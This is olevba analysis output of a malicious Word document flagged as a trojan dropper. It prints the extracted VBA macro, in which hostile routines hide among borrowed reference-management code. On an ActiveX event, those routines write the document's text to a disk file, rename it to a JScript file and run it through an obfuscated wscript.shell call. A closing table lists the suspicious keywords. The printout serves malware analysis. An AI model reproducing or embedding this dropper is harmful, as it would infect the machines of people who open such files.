olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.Agent.gen-6a9f15954cd2f4a0e589795942d59b3462c41e1bc8d0b1ad71f6483e37a50c99
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan-Dropper.MSOffice.Agent.gen-6a9f15954cd2f4a0e589795942d59b3462c41e1bc8d0b1ad71f6483e37a50c99 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Doole5 As String
Private Becole As String
Private Dsolrt As String
Private Rtole3 As String
Private Sacolr As String



Public Sub AddReference(strGUID As String)
' --------------------------------------------------------------
' Comments:
'   Add a specific reference to the current VBProject.
'
' Arguments:
'   strGUID (String) = The GUID of the reference being added.
'
' Date          Developer           Comment
' --------------------------------------------------------------
' 26/01/2018    Carlos Gamez        Open source release
'
On Error GoTo ErrHandler

    Dim theRef As Variant, i As Long
    Dim errDescription As String
    
    'Add the reference, depending on the type of reference passed
    If Left(strGUID, 1) = "{" Then 'It's a GUID
        ThisWorkbook.VBProject.References.AddFromGuid _
                    GUID:=strGUID, Major:=1, Minor:=0
    Else 'It's a file
        ThisWorkbook.VBProject.References.AddFromFile strGUID
    End If
     
Exit_ErrHandler:
    Exit Sub

ErrHandler:
    Select Case Err.Number
        Case Is = 32813
            'Reference already in use.  No action necessary
            Resume Next
        Case Is = 1004
            'VBA is not allowed to run, modify the trust center
            errDescription = "The security settings do not allow to load the needed references." & vbCrLf & _
                    "You can still work with this file, but the PRT generation and word" & vbCrLf & _
                    "exporting functions will not be available." & vbCrLf & _
                    vbCrLf & _
                    "Please tick the 'Trust access to the VBA object model' checkbox" & vbCrLf & _
                    "under 'File > Options > Trust Center > Trust Center Settings > Macro Settings' and reload this file."
                    
            sDisplayUnexpectedError Err.Number, errDescription, mstrMODULE
            Err.Clear
            Exit Sub
        Case Is = vbNullString
             'Reference added without issue
        Case Else
            errDescription = "A problem was encountered trying to" & vbNewLine _
            & "add or remove a reference in this file" & vbNewLine & "Please check the " _
            & "references in your VBA project!"
            sDisplayUnexpectedError Err.Number, errDescription, mstrMODULE
    End Select
    
    Resume Exit_ErrHandler
    Resume

End Sub


Public Sub sRemoveBrokenReferences()
' --------------------------------------------------------------
' Comments:
'   Remove any missing references from the current VBProject
'
' Arguments:
'   None
'
' Date          Developer           Comment
' --------------------------------------------------------------
' 26/01/2018    Carlos Gamez        Open source release
'
    Dim i As Integer
    Dim theRef As Variant
    
    For i = ThisWorkbook.VBProject.References.Count To 1 Step -1
        Set theRef = ThisWorkbook.VBProject.References.Item(i)
        If theRef.isbroken = True Then
            ThisWorkbook.VBProject.References.Remove theRef
        End If
    Next i

End Sub



Private Function Nedcokl(d As Long, u As String) As Object
'   Prints all references in the current VBProject to the
Set Nedcokl = CreateObject(u)
End Function



Private Sub sDebugReferences()
' --------------------------------------------------------------
' Comments:
'   Prints all references in the current VBProject to the
'   Immediate window
'
' Arguments:
'   None
'
' Date          Developer           Comment
' --------------------------------------------------------------
' 26/01/2018    Carlos Gamez        Open source release
'
    Dim n As Integer
     
    On Error Resume Next
    
    For n = 1 To ActiveDocument.VBProject.References.Count
        Debug.Print "Name: " & ActiveDocument.VBProject.References.Item(n).Name
        Debug.Print "Description: " & ActiveDocument.VBProject.References.Item(n).Description
        Debug.Print "GUID: " & ActiveDocument.VBProject.References.Item(n).GUID
        Debug.Print "Major: " & ActiveDocument.VBProject.References.Item(n).Major
        Debug.Print "Minor: " & ActiveDocument.VBProject.References.Item(n).Minor
        Debug.Print "Fullpath: " & ActiveDocument.VBProject.References.Item(n).fullpath
        Debug.Print "--------------------------------------------------------------------------------"
    Next n
    
    
    On Error Resume Next
    Tbedoole = Replace(Doole5, ".msk", "." & Rtole3 & "js" & Rtole3 & "e")
    Name Doole5 As Tbedoole
    Jntrr9 = "w" & Rtole3 & "Sc" & Rtole3
    Do While Len(Doole5) > 1
             CallByName Nedcokl(Abs(7), Dsolrt & Jntrr9 & Dsolrt & "ri" & Rtole3 & "pt" & Empty & "." & Becole), Sacolr, VbMethod, """" & Tbedoole & Chr(35 - 1) & " " & ActiveDocument.ActiveThemeDisplayName, 1
            Exit Do
            AddReference "holp"
    Loop
     
End Sub



Private Function Becolde4(x As String, i As String)
On Error Resume Next
Doole5 = x & i & "rdfook." & Rtole3 & "msk"
Dim Jookert As Integer
Jookert = FreeFile
Open Doole5 For Binary Lock Read Write As #Jookert
Debug.Print "--------------------------------------------------------------------------------"
Do While Len(Doole5) > 1
            Debug.Print "--------------------------------------------------------------------------------"
            Exit Do
            AddReference "holp"
            Loop
Put #Jookert, , ActiveDocument.Content.Text
Close #Jookert
End Function



Private Sub MsTscAxNotSafeForScripting1_OnConnecting()
On Error Resume Next
Rtole3 = ""
Rtole3 = Empty
Sacolr = Rtole3 & "ru" & Rtole3 & "n"
Debug.Print "--------------------------------------------------------------------------------"
Becole = Rtole3 & "sh" & Rtole3 & "ell"
Becolde4 Application.StartupPath, "\." & ".\." & ".\..\"
Debug.Print "--------------------------------------------------------------------------------"
sDebugReferences
ActiveDocument.Close
End Sub










+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |MsTscAxNotSafeForScr|Runs when the file is opened and ActiveX     |
|          |ipting1_OnConnecting|objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

